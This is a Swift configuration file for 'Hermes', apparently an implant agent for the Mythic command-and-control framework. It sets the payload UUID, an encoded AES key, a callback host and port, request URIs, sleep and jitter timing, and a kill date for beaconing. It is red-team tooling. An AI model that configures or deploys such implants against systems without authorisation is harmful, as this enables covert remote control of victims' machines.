//
//  config.swift
//  Hermes
//
//  Created by slyd0g on 5/23/21.
//

import Foundation

struct AgentConfig {
    // Mythic components
    var payloadUUID: String
    var encodedAESKey: String
    
    // C2 components
    var callbackHost: String
    var getRequestURI: String
    var postRequestURI: String
    var callbackPort: Int
    var userAgent: String
    var hostHeader: String
    var useSSL: Bool
    var queryParameter: String
    
    // Agent components
    var sleep: Int32
    var jitter: Int32
    var killDate: String //year-month-day, ex. 1994-01-05
}

var agentConfig = AgentConfig(
    payloadUUID: "4c601578-9123-4db3-bf76-281b4c361a6c",
    encodedAESKey: "XXjENt7hXJWlAh7grhstMle5XeK7b2C3uvBXXwF3hlM=",

    callbackHost: "192.168.196.3",
    getRequestURI: "/index",
    postRequestURI: "/data",
    callbackPort: 80,
    userAgent: "Hermes user agent",
    hostHeader: "",
    useSSL: false,
    queryParameter: "q",

    sleep: 5,
    jitter: 5,
    killDate: "2022-05-01"
)
